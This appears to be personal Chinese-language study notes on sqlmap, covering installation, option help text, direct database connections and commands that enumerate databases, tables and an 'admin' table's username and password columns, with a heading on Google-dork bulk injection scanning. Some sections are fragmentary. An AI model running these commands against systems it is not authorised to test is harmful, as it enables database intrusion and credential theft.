#

由 python 编写，支持 2.x 和 3.x

从 github 下载，直接运行即可

```
git clone --depth 1 https://gitee.com/billscofield/sqlmap.git sqlmap-dev
ln -s $PWD/sqlmap.py /usr/local/bin/sqlmap

apt install python-sqlalchemy
apt install python-pymysql
pip install mysqlclient
python3 -m pip install PyMySQL      //还是这个管用，看sqlmap的输出信息
```

Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -d DIRECT           Connection string for direct database connection
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
    -m BULKFILE         Scan multiple targets given in a textual file
    -r REQUESTFILE      Load HTTP request from a file
    -g GOOGLEDORK       Process Google dork results as target URLs
    -c CONFIGFILE       Load options from a configuration INI file


## sqlmap 直连数据库

服务型数据库(前提知道数据库用户名和密码)
    DBMS://user:password@DBMS_IP:PORT/Database_name(MySQL, Oracle, Microsoft SQLServer, PostgreSQL, etc)
    例如:
        sqlmap -d "mysql://bill:llib@localhost:3306/myemployees" -f --banner --dbs --users

文件型数据库
    DBMS://database_filepath(SQLite, Microsoft Access, Firebird, etc)

## sqlmap URL 探测

直接对单一URL探测，参数使用 -u(--url)

http(s)://targeturl[:port]/[...]

例如:
    sqlmap -u "http://www.target.com/vuln.php?id=1" --banner

## sqlmap 文件读取目标

-l  
 database table(s) to enumerate

-x 

## sqlmap google 批量扫注入


    --dbs               Enumerate DBMS databases

sqlmap -u "http://xxx" --tables                                         //看有哪些表

    --tables            Enumerate DBMS database tables

sqlmap -u "http://xxx" --columns -T admin                               //admin表有哪些列

    --columns           Enumerate DBMS database table columns

    -T TBL              DBMS database table(s) to enumerate

sqlmap -u "http://xxx" --columns -T admin -C "username,password"        //admin表,username和password 列的内容

    -C COL              DBMS database table column(s) to enumerate

    --dump              Dump DBMS database table entries

